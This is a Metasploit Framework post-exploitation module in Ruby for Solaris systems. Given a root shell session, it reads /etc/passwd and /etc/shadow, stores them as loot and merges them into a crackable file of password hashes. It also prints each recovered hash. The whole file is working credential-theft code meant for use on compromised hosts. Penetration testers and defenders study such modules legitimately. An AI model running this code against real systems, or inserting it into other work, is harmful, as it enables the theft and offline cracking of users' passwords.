##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Solaris::Priv

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Solaris Gather Dump Password Hashes for Solaris Systems',
				'Description'   => %q{ Post Module to dump the password hashes for all users on a Solaris System},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Platform'      => [ 'solaris' ],
				'SessionTypes'  => [ 'shell' ]
			))

	end

	# Run Method for when run command is issued
	def run
		if is_root?
			passwd_file = read_file("/etc/passwd")
			shadow_file = read_file("/etc/shadow")

			# Save in loot the passwd and shadow file
			p1 = store_loot("solaris.shadow", "text/plain", session, shadow_file, "shadow.tx", "Solaris Password Shadow File")
			p2 = store_loot("solaris.passwd", "text/plain", session, passwd_file, "passwd.tx", "Solaris Passwd File")
			vprint_status("Shadow saved in: #{p1.to_s}")
			vprint_status("passwd saved in: #{p2.to_s}")

			# Unshadow the files
			john_file = unshadow(passwd_file, shadow_file)
			john_file.each_line do |l|
				print_good(l.chomp)
			end
			# Save pwd file
			upassf = store_loot("solaris.hashes", "text/plain", session, john_file, "unshadowed_passwd.pwd", "Solaris Unshadowed Password File")
			print_good("Unshadowed Password File: #{upassf}")

		else
			print_error("You must run this module as root!")
		end

	end

	def unshadow(pf,sf)
		unshadowed = ""
		sf.each_line do |sl|
			pass = sl.scan(/^\w*:([^:]*)/).join
			if pass !~ /^\*LK\*|^NP/
				user = sl.scan(/(^\w*):/).join
				pf.each_line do |pl|
					if pl.match(/^#{user}:/)
						unshadowed << pl.gsub(/:x:/,":#{pass}:")
					end
				end
			end
		end
		return unshadowed
	end
end
